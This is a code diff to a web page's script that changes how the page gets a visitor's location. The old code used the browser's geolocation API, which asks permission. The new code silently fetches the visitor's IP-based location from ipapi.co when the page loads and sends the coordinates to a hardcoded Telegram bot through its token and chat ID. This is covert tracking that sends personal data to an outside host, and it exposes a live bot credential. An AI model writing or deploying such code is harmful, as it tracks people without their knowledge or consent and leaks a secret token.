@@ -10,23 +10,28 @@
 
     <script>
         function getLocationAndSend() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
+            fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                var latitude = data.latitude;
+                var longitude = data.longitude;
+
+                var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
+                var chatId = '829549685';
+
+                var message = 'New location: Latitude ' + latitude + ', Longitude ' + longitude;
+
+                sendLocation(token, chatId, message);
+            })
+            .catch(error => {
+                console.error('Error getting location:', error);
+            });
         }
 
-        function sendLocation(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-
-            var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
-            var chatId = '829549685';
-
+        function sendLocation(token, chatId, message) {
             var data = {
                 chat_id: chatId,
-                text: 'New location: Latitude ' + latitude + ', Longitude ' + longitude
+                text: message
             };
 
             fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
@@ -43,7 +48,7 @@
                 console.error('Error sending location:', error);
             });
         }
-        
+
         getLocationAndSend();
     </script>
 </body>
